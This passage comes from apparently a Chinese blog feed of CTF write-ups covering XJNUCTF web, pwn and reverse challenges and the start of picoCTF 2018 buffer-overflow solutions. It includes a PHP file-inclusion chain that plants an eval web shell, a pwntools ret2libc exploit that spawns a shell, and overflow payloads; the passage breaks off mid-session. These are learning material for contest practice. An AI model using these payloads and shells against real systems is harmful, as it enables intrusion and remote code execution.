<h3 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/7.png" alt="7"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/8.png" alt="8"></p>
<p>弹出提示 你不属于这里 </p>
<p>猜测需要伪造访问ip</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/9.png" alt="9"></p>
<p>配置好burp代理</p>
<p>抓包伪造ip</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/10.png" alt="10"></p>
<p>提示未登录 修改0为1</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/11.png" alt="11"></p>
<p>她会提示你用的不是iphone 999</p>
<p>利用谷歌浏览器模拟iphone客户端</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/12.png" alt="12"></p>
<p>抓包</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/13.png" alt="13"></p>
<p>得到iPhonex的地址</p>
<p>修改os版本</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/14.png" alt="14"></p>
<p>得到flag</p>
<h3 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/15.png" alt="15"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/16.png" alt="16"></p>
<p>提示 flag就在index.php中 但是没办法查看 猜测为git泄露</p>
<p>使用工具githack</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/17.png" alt="17"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/18.png" alt="18"></p>
<p>得到flag</p>
<h3 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h3><p><img src="/2018/10/04/XJNUCTF-Writeup/19.png" alt="19"></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/20.png" alt="20"></p>
<p>发现url处存在文件包含</p>
<p>尝试读取upload.php源码</p>
<p></p><p class="code-caption" data-lang="php+html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php+html"><code class="language-php+html">http://ctf.xjnu.edu.cn:666/index.php?file=php://filter/read=convert.base64-encode/resource=upload.php
</code></pre>
<p><img src="/2018/10/04/XJNUCTF-Writeup/21.png" alt="21"></p>
<p>Base64解密即可得到源码</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/22.png" alt="22"></p>
<p>发现upload目录可任意读取下载,</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/23.png" alt="23"></p>
<p>打开得到源码</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/24.png" alt="24"></p>
<p>过滤了%00</p>
<p>这里用到了王松师傅的思路</p>
<p><a href="https://www.hackersb.cn/hacker/105.html" target="_blank" rel="external">https://www.hackersb.cn/hacker/105.html</a></p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/25.png" alt="25"></p>
<p>测试创建一个php文件</p>
<p>接着压缩修改后缀名为 ss.png</p>
<p>Exp</p>
<p></p><p class="code-caption" data-lang="php+html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php+html"><code class="language-php+html">http://ctf.xjnu.edu.cn:666/index.php?file=zip://upload/ss.png%23he.html.php
</code></pre>
<p>成功执行命令</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/26.png" alt="26"></p>
<p>写入一句话</p>
<p></p><p class="code-caption" data-lang="php" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span>
</code></pre>
<p><img src="/2018/10/04/XJNUCTF-Writeup/27.png" alt="27"></p>
<p>成功拿到shell</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/28.png" alt="28"></p>
<p>成功拿到flag</p>
<h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-70h]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"send success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>程序很简单 没有多余的流程 漏洞也很明显</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ checksec babypwn
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/babypwn'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
ubuntu@ubuntu:~$
</code></pre>
<p>NX开启 </p>
<p>思路：</p>
<p>通过溢出leak puts 从而得到libc版本 进而得到system地址及bin/sh地址 </p>
<p>偏移计算 offset = 0x70+8 </p>
<p>构造leak</p>
<p>寻找gadget</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~$ ROPgadget --binary babypwn --only <span class="token string">"pop|ret"</span>
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x000000000040071c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400720 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400722 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x0000000000400595 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret
0x0000000000400723 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret  // 这里是我们需要的
0x0000000000400721 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x000000000040071d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret
0x00000000004004e1 <span class="token keyword">:</span> ret
0x00000000004005c5 <span class="token keyword">:</span> ret 0xc148

Unique gadgets found: 12
</code></pre>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babypwn'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babypwn'</span><span class="token punctuation">)</span>

puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

<span class="token keyword">print</span> <span class="token string">'puts_plt:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> <span class="token string">'puts_got:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>
pop_rdi<span class="token operator">=</span><span class="token number">0x400723</span> <span class="token comment" spellcheck="true">#pop rdi ; ret</span>

p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What do you plan to do?\n"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>
payload <span class="token operator">=</span>  溢出偏移<span class="token operator">+</span>pop_rdi_ret（因为<span class="token number">64</span>位下以寄存器传参）<span class="token operator">+</span>给puts<span class="token punctuation">(</span><span class="token punctuation">)</span>赋值<span class="token operator">+</span>循环地址<span class="token punctuation">(</span>也可以是leak该puts的函数地址<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"send success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
</code></pre>
<p>通过<a href="https://libc.blukat.me" target="_blank" rel="external">https://libc.blukat.me</a> 进行查询</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/libcsearch.jpg" alt="libcsearch"></p>
<p>找到libc版本 接着获取system地址及binsh地址</p>
<pre class=" language-python"><code class="language-python">system <span class="token operator">=</span> puts <span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
binsh <span class="token operator">=</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
binsh <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> binsh
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">120</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> 
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>成功getshell</p>
<h2 id="RE50"><a href="#RE50" class="headerlink" title="RE50"></a>RE50</h2><p><img src="/2018/10/04/XJNUCTF-Writeup/29.png" alt="29"></p>
<p>使用IDA打开</p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/30.png" alt="30"></p>
<p>定位到main函数</p>
<p>看到一些常量 </p>
<p><img src="/2018/10/04/XJNUCTF-Writeup/31.png" alt="31"></p>
<p>拼接 即可获得flag</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Web10&quot;&gt;&lt;a href=&quot;#Web10&quot; class=&quot;headerlink&quot; title=&quot;Web10&quot;&gt;&lt;/a&gt;Web10&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2018/10/04/XJNUCTF-Writeup/1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;

    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>picoctf-Writeup</title>
    <link href="http://iosmosis.github.io/2018/10/02/picoctf-Writeup/"/>
    <id>http://iosmosis.github.io/2018/10/02/picoctf-Writeup/</id>
    <published>2018-10-02T12:05:03.000Z</published>
    <updated>2018-10-05T06:27:40.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="buffer-overflow-0"><a href="#buffer-overflow-0" class="headerlink" title="buffer overflow 0"></a>buffer overflow 0</h3><p>查看程序源代码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp-Ch] [ebp-1Ch]</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-Ch]</span>

  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span>
      <span class="token string">"Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This program takes 1 argument."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks! Received: %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>将flag.txt读入栈中</p>
<p>那么第一想法就应该是ssp leak flag</p>
<p>查看保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ checksec
CANARY    <span class="token keyword">:</span> disabled
FORTIFY   <span class="token keyword">:</span> disabled
NX        <span class="token keyword">:</span> ENABLED
PIE       <span class="token keyword">:</span> disabled
RELRO     <span class="token keyword">:</span> Partial
gdb-peda$
</code></pre>
<p>发现没开一canary  ==</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __cdecl __noreturn <span class="token function">sigsegv_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>在代码中找到 一处print flag的地方 那么就可以尝试溢出到sigsegv_handler地址 打印flag</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-18h]</span>

  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//溢出点</span>
<span class="token punctuation">}</span>
</code></pre>
<p>payload</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>./buffer0 `python -c &quot;print &#39;a&#39;*0x18+&#39;bbbb&#39;+&#39;\x2B\x86\x04\x08&#39;&quot;`
</code></pre><p>\x2B\x86\x04\x08是 sigsegv_handler地址</p>
<p>远程尝试获取flag</p>
<p><img src="/2018/10/02/picoctf-Writeup/1.jpg" alt="1"></p>
<h3 id="buffer-overflow-1"><a href="#buffer-overflow-1" class="headerlink" title="buffer overflow 1"></a>buffer overflow 1</h3><p>查看题目得知 此次只需要跳转到win地址即可</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please enter your string: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>跟入vuln</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>
  <span class="token keyword">int</span> savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp+0h]</span>

  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在溢出</span>
  v0 <span class="token operator">=</span> <span class="token function">get_return_address</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Okay, time to return... Fingers Crossed... Jumping to 0x%x\n"</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>win_addr = 0x80485CB</p>
<p>构造本地payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./buffer1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span><span class="token string">'bbbb'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x80485CB</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>构造远程payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">iosmosis@pico<span class="token number">-2018</span><span class="token operator">-</span>shell<span class="token number">-1</span><span class="token punctuation">:</span><span class="token operator">~</span>$ cd <span class="token operator">/</span>problems<span class="token operator">/</span>buffer<span class="token operator">-</span>overflow<span class="token operator">-</span>1_3_af8f83fb19a7e2c98e28e325e4cacf78
iosmosis@pico<span class="token number">-2018</span><span class="token operator">-</span>shell<span class="token number">-1</span><span class="token punctuation">:</span><span class="token operator">/</span>problems<span class="token operator">/</span>buffer<span class="token operator">-</span>overflow<span class="token operator">-</span>1_3_af8f83fb19a7e2c98e28e325e4cacf78$ python
Python <span class="token number">2.7</span><span class="token punctuation">.</span><span class="token number">12</span> <span class="token punctuation">(</span>default<span class="token punctuation">,</span> Dec  <span class="token number">4</span> <span class="token number">2017</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">)</span> 
<span class="token punctuation">[</span>GCC <span class="token number">5.4</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token number">20160609</span><span class="token punctuation">]</span> on linux2
